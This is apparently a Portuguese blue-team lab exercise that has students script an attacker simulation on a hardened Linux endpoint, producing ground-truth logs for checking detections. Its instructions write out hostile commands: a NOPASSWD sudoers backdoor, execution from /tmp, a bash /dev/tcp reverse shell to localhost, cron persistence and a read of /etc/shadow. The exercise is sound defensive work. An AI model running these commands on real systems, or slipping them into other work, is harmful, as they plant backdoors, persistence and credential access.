# 11. A Simulação de Atacante no Linux

**Objetivo:** Executar uma sequência controlada de ações típicas de atacante no endpoint Linux já hardenizado e registrar a verdade fundamental.

## Contexto

A mesma metodologia de validação aplicada ao Windows agora se aplica ao Linux. As ações do atacante espelham as técnicas específicas de Linux do advisório Crimson Tide: criar um usuário, modificar o sudoers, executar a partir de `/tmp`, tentar um reverse shell (para localhost, seguro), estabelecer persistência via cron, acessar arquivos sensíveis.

## Instruções

Escreva um script `11-linux_attack_sim.sh` que execute a seguinte sequência com timestamps:

- Criar um usuário (`useradd testattacker`)
- Modificar o sudoers (`echo "testattacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers.d/backdoor`)
- Executar um binário a partir de `/tmp` (`cp /usr/bin/id /tmp/suspicious_bin && /tmp/suspicious_bin`)
- Tentar um reverse shell para localhost (`bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &' ; sleep 1 ; kill %1 2>/dev/null`)
- Modificar o crontab (`echo "* * * * * /tmp/beacon.sh" > /etc/cron.d/persistence_test`)
- Acessar arquivos sensíveis (`cat /etc/shadow > /dev/null`)

Limpe todos os artefatos. Produza o JSON de ground truth.

## Saída Esperada

```
$ sudo ./11-linux_attack_sim.sh
[*] Running Linux attacker simulation...
    [1/6] Creating user testattacker...                2026-03-25T14:35:01Z
    [2/6] Modifying sudoers...                         2026-03-25T14:35:02Z
    [3/6] Executing from /tmp...                       2026-03-25T14:35:03Z
    [4/6] Reverse shell attempt (localhost)...         2026-03-25T14:35:04Z
    [5/6] Cron persistence...                          2026-03-25T14:35:05Z
    [6/6] Accessing /etc/shadow...                     2026-03-25T14:35:06Z
[*] Cleaning up artifacts...                           [CLEAN]
Actions executed: 6
Ground truth saved to: linux_attack_log.json
```

## Repositório

- **Repositório GitHub:** `dlh-cyber_security`
- **Diretório:** `blue_team/2x02_eyes_on_endpoint`
- **Arquivo:** `11-linux_attack_sim.sh`
